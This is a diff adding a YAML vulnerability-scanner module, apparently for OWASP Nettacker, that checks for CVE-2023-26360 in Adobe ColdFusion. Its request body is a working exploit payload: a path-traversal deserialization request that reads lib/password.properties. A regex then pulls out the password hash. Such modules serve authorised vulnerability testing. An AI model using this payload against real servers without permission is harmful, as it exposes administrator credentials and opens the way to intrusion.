@@ -1,0 +1,52 @@
+info:
+  name: adobe_coldfusion_cve_2023_26360_vuln
+  author: Jimmy Ly
+  severity: 9.8
+  description: CVE-2023-26360 - Unauthenticated deserialization of untrusted data vulnerability in Adobe ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier, in order to gain unauthenticated arbitrary file read and remote code execution.
+  reference: 
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-26360
+    - https://helpx.adobe.com/security/products/coldfusion/apsb23-25.html
+    - http://packetstormsecurity.com/files/172079/Adobe-ColdFusion-Unauthenticated-Remote-Code-Execution.html
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - cve
+    - adobe
+    - coldfusion
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: application/x-www-form-urlencoded
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              paths:  
+                - "cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc"
+                - "CFIDE/wizards/common/utils.cfc"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8500
+        data: _variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d
+        response:
+          condition_type: and
+          conditions:
+            content:
+              regex: "(?<=password=)[A-F0-9]+"
+              reverse: false
